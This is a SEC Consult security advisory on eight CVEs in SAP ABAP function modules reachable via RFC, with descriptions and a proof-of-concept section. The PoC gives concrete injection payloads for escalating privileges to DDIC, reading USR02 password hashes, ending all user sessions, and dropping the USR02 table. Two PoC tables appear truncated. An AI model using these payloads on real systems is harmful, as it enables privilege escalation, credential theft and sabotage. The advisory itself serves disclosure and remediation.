Business recommendation:
------------------------
By exploiting the vulnerabilities documented in this advisory, privileged
attackers can take complete control of affected application servers. Thus,
successful exploitation can enable fraud, sabotage or data theft while
affecting confidentiality, integrity, and availability of business data.

SEC Consult recommends to implement security notes 2958563, 2973735,
2993132, 2986980, 2999854, 3002517, 3048657 where the documented issues
are fixed according to the vendor. We advise installing the corrections
as a matter of priority to keep business-critical data secured.

Vulnerability overview/description:
-----------------------------------
Advanced Business Application Programming (ABAP)® is a proprietary
programming language by SAP SE. In common with every other programming
language, ABAP can be susceptible to software vulnerabilities ranging
from missing or improper authorization checks to inadequate input
validation and output sanitization. Of particular concern are injection
vulnerabilities, which can jeopardize the overall system security.

Remote Function Call (RFC) is a proprietary network protocol by SAP SE.
Comparable to application programming interfaces (APIs), SAP systems
come with thousands of built-in function modules implemented in ABAP. RFC
allows remote-enabled functions to be accessed via the network. This makes
it possible to decentralize business applications even across system
boundaries. External programs and external clients can make use of RFC
connections to interact with an SAP system via libraries (e.g. NW RFC SDK)
provisioned by SAP SE.

This advisory covers multiple critical vulnerabilities discovered in
the ABAP® coding of standard function modules. These are part of different
software components that build upon the bedrock products SAP® Application
Server ABAP and ABAP® Platform.

1) [CVE-2020-6318] Code Injection Vulnerability in SAP NetWeaver
    (ABAP Server) and ABAP Platform

    Function modules RSDU_LIST_DB_TABLE_SYB and RSDU_LIST_DB_TABLE_DB4
    of function groups RSDU_UTIL_SYB and RSDU_CORE_UTIL_DB4 are vulnerable
    to ABAP code injection bugs allowing to execute arbitrary ABAP
    code. Successful exploitation leads to full system compromise.

2) [CVE-2020-26808] Code Injection Vulnerability in SAP AS ABAP
    and S/4 HANA (DMIS)

    Function module CNV_MBT_SEL_STRING_RETURN of function group
    CNV_MBT_SEL is vulnerable to an ABAP code injection bug allowing to
    embed arbitrary code into the ABAP Repository. An attacker can abuse
    this bug by invoking the function remotely via the RFC protocol.
    Successful exploitation leads to full system compromise.

3) [CVE-2020-26832] Missing Authorization Check in SAP NetWeaver
    AS ABAP and SAP S4 HANA (SAP Landscape Transformation)

    Function module CNV_GET_USERS_FOR_APP_SERVER of function group
    CNV_00001_HELP does not perform any programmatically implemented
    authorization check. An attacker can abuse this bug by invoking
    the function remotely via the RFC protocol. Successful exploitation
    allows to retrieve internal information and to make a targeted SAP
    system completely unavailable to its intended users. The latter
    is to be considered as a Denial of Service (DoS) attack.

4) [CVE-2021-21468] Missing Authorization Check in SAP Business
    Warehouse (Database Interface)

    Function module RSDL_DB_GET_DATA_BWS of function group RSDL does
    not perform any programmatically implemented authorization check.
    An attacker can abuse this bug by invoking the function remotely
    via the RFC protocol. Successful exploitation allows to read out
    the entire database including cross-client data access.

5) [CVE-2021-21465] Native SQL Injection Vulnerability in SAP
    Business Warehouse (Database Interface)

    Function module RSDL_DB_GET_DATA_BWS of function group RSDL is
    vulnerable to a native SQL injection (ADBC) bug allowing to execute
    arbitrary SQL commands at database level. An attacker can abuse
    this bug by invoking the function remotely via the RFC protocol.
    Successful exploitation leads to full system compromise.

6) [CVE-2021-21466] Code Injection Vulnerability in SAP Business
    Warehouse and SAP BW/4HANA

    Function module RSDRI_DF_TEXT_READ of function group RSDRI_DF_FACADE
    is vulnerable to an ABAP code injection bug allowing to embed
    arbitrary code into the ABAP Repository. An attacker can abuse this
    bug by invoking the function remotely via the RFC protocol. Successful
    exploitation leads to full system compromise.

7) [CVE-2021-21473] Missing Authorization Check in SAP NetWeaver AS ABAP
    and ABAP Platform

    Function module SRM_RFC_SUBMIT_REPORT of function group SRM_REP does not
    enforce proper authorization checks for critical use of a dynamic program
    call. An attacker can abuse this bug by invoking the function remotely
    via the RFC protocol. Successful exploitation allows an attacker to
    execute existing ABAP reports without holding sufficient authorizations.

8) [CVE-2021-33678] Code Injection vulnerability in SAP NetWeaver AS ABAP
    (Reconciliation Framework)

    Function module CONVERT_FROM_CHAR_SORT_RFW of function group FG_RFW contains
    a code injection vulnerability with a limited exploitation primitive. An
    attacker can abuse this bug to delete critical system tables (e.g. USR02),
    making the targeted SAP system completely unavailable to its intended users.

Proof of concept:
-----------------

1) [CVE-2020-6318] Code Injection Vulnerability in SAP NetWeaver
    (ABAP Server) and ABAP Platform

    The vulnerable functions make use of the GENERATE SUBROUTINE POOL
    instruction by providing source code that is created dynamically
    using untrusted user input. As there is no input validation or
    output sanitization, an attacker can inject malicious ABAP code
    through specific import parameters. This code gets executed on the
    fly by the application server in the course of execution of the
    functions.

    The following payload exploits the bug to escalate privileges via
    reference user assignment:

    Import Parameter:        I_TABLNM
    Value:                   USR02

    Import Table: I_T_SELECT_FIELDS
     ╒═══════════════════════════════════════════════════════════════╕
     │ RSD_FIELDNM                                                   │
     ╞═══════════════════════════════════════════════════════════════╡
     │ BNAME                                                         │
     ╘═══════════════════════════════════════════════════════════════╛
    Import Table: I_T_WHERE_COND
     ╒═══════════╤══════╤════════════════════════════════════════════╕
     │ FIELDNM   │ OP   │ LOW                                        │
     ╞═══════════╪══════╪════════════════════════════════════════════╡
     │ BNAME     │ EQ   │ S'ENDEXEC. EXEC SQL.UPDATE USREFUS SET     │
     │           │      │ REFUSER = 'DDIC' WHERE BNAME = 'ATTACKER   │
     ╘═══════════╧══════╧════════════════════════════════════════════╛

2) [CVE-2020-26808] Code Injection Vulnerability in SAP AS ABAP
    and S/4 HANA (DMIS)

    The vulnerable function makes use of the INSERT REPORT instruction
    by providing source code that is created dynamically using untrusted
    user input. As there is no input validation or output sanitization,
    an attacker can inject malicious ABAP code through specific import
    parameters. Inserted code may be executed by chaining this bug with
    CVE-2021-21473.

    The following payload exploits the bug to escalate privileges via
    reference user assignment:

    Import Parameter:    TABNAME
    Value:               USR02

    Import Table: IMT_SELSTRING
     ╒══════════════════════════════════════════════════════════════╕
     │ LINE                                                         │
     ╞══════════════════════════════════════════════════════════════╡
     │ BNAME = 'TEST'. ENDSELECT.                                   │
     ├──────────────────────────────────────────────────────────────┤
     │ UPDATE USREFUS SET REFUSER = 'DDIC' WHERE BNAME = 'ATTACKER' │
     ├──────────────────────────────────────────────────────────────┤
     │ SELECT * FROM USR02                                          │
     ╘══════════════════════════════════════════════════════════════╛

3) [CVE-2020-26832] Missing Authorization Check in SAP NetWeaver
    AS ABAP and SAP S4 HANA (SAP Landscape Transformation)

    The vulnerable function does not perform any explicit authorization
    check. Depending on a specific import parameter, the function leaks
    active logon sessions (opcode 02) or terminates all active logon
    sessions (opcode 25) by kernel call 'ThUsrInfo'. Invoking the function
    periodically prevents users from logging into the application server.

    The following payload exploits the bug to trigger the information
    disclosure and enumerate active user sessions:

    Import Parameter:   MODE
    Value:               1

    The following payload exploits the bug to terminate all active user
    sessions:

    Import Parameter:   MODE
    Value:               2

4) [CVE-2021-21468] Missing Authorization Check in SAP Business
    Warehouse (Database Interface)

    The vulnerable function does not perform any explicit authorization
    check. It uses predefined classes and methods from the ABAP Database
    Connectivity (ADBC) framework to execute native SQL queries at database
    level. Depending on specific import parameters, this allows to read out
    arbitrary table data including user master records or secure storages
    (e.g. RSECTAB).

    The following payload exploits the bug to exfiltrate user password
    hashes:

    Import Table: I_S_TABSEL
     ╒══════════════════════════════════════════════════════════════╕
     │ NAME                                                         │
     ╞══════════════════════════════════════════════════════════════╡
     │ USR02                                                        │
     ╘══════════════════════════════════════════════════════════════╛
    Import Table: I_S_DBCON
     ╒══════════════════════════════════════════════════════════════╕
     │ CON_NAME                                                     │
     ╞══════════════════════════════════════════════════════════════╡
     │ <Database Connection String> (e.g. DEFAULT)                  │
     ╘══════════════════════════════════════════════════════════════╛
    Import Table: I_T_DBFIELDS
     ╒═══════════════╤═════════╤════════════════════════════════════╕
     │ NAME          │ TYPE    │   LENGTH                           │
     ╞═══════════════╪═════════╪════════════════════════════════════╡
     │ BNAME         │ CHAR255 │   000255                           │
     ├───────────────┼─────────┼────────────────────────────────────┤
     │ PWDSALTEDHASH │ CHAR255 │   000255                           │
     ╘══════════════════════════════════════════════════════════════╛

5) [CVE-2021-21465] Native SQL Injection Vulnerability in SAP
    Business Warehouse (Database Interface)

    The vulnerable function does not perform any input validation or
    output sanitization on import parameters that can be used to define
    conditional SQL statements. This allows to inject arbitrary SQL
    commands that get executed natively at database level in the course
    of execution of the function.

    The following payload exploits the bug to escalate privileges via
    reference user assignment:

    Import Table: I_S_TABSEL
     ╒══════════════════════════════════════════════════════════════╕
     │ NAME                                                         │
     ╞══════════════════════════════════════════════════════════════╡
     │ USR02                                                        │
     ╘══════════════════════════════════════════════════════════════╛

    Import Table: I_S_DBCON
     ╒══════════════════════════════════════════════════════════════╕
     │ CON_NAME                                                     │

     ╘══════════════════════════════════════════════════════════════╛

6) [CVE-2021-21466] Code Injection Vulnerability in SAP Business
    Warehouse and SAP BW/4HANA

    The vulnerable function makes use of the INSERT REPORT instruction
    by providing source code that is created dynamically using untrusted
    user input. As there is no input validation or output sanitization,
    an attacker can inject malicious ABAP code through specific import
    parameters. Inserted code may be executed by chaining this bug with
    CVE-2021-21473.

    The following payload exploits the bug to escalate privileges via
    reference user assignment:

    Import Parameter:   I_TABLE_NAME
    Value:               INJECTION

    Import Parameter:   I_DEBUG_SUFFIX
    Value:               SAP

    Import Table: I_T_RANGE_STRING
     ╒═══════════╤═════════════════════════════════════╤════════════╕
     │ CHANM     │ LOW                                 │ HIGH       │

     ╘═══════════╧═════════════════════════════════════╧════════════╛

7) [CVE-2021-21473] Missing Authorization Check in SAP NetWeaver AS ABAP
    and ABAP Platform

    The vulnerable function uses a dynamically generated program name (based
    on data from untrusted sources) in a SUBMIT call. No authorization checks
    are programmatically enforced. Thus, a remote, unauthorized attacker can
    leverage this function to start any existing ABAP report by providing the
    respective report name in the import parameter REPORTNAME.

8) [CVE-2021-33678] Code Injection vulnerability in SAP NetWeaver AS ABAP
    (Reconciliation Framework)

    The vulnerable function makes use of the GENERATE SUBROUTINE POOL instruction
    in form 'get_dynamic_fields' by providing source code that is created
    dynamically using untrusted user input. As there is no input validation or
    output sanitization, an attacker can inject malicious ABAP code through specific
    import parameters. These parameters are limited in size due to their variable
    type. This restricts an attacker in exploitation scenarios. However, it is still
    possible, for example, to delete critical system tables by exploiting this bug.

    The following payload exploits the bug to drop table USR02, leading to a complete
    loss of availability of the target system:

    Import Parameter:   RTABNAME
    Value:               X. EXEC SQL. DROP TABLE USR02-

    Import Parameter:   RFIELDNAME
    Value:               ENDEXEC
